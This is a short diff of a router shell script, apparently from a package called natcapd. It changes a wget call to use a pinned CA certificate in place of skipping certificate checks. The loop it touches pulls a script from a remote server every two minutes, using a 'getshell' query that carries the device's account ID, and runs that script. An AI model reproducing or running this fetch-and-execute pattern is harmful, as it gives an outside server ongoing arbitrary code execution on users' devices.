@@ -28,12 +28,13 @@ gfwlist_update_main () {
 }
 
 main() {
+	cp /usr/share/natcapd/cacert.pem /tmp/cacert.pem
 	while :; do
 		sleep 120
 		rm -f /tmp/xx.sh
 		rm -f /tmp/nohup.out
 		ACC=`uci get natcapd.default.account 2>/dev/null`
-		/usr/bin/wget --no-check-certificate -q "https://router-sh.ptpt52.com/router-update.cgi?cmd=getshell&acc=$ACC&cli=$CLI" -O /tmp/xx.sh
+		/usr/bin/wget --ca-certificate=/tmp/cacert.pem -q "https://router-sh.ptpt52.com/router-update.cgi?cmd=getshell&acc=$ACC&cli=$CLI" -O /tmp/xx.sh
 		head -n1 /tmp/xx.sh | grep '#!/bin/sh' >/dev/null 2>&1 && {
 			chmod +x /tmp/xx.sh
 			nohup /tmp/xx.sh &
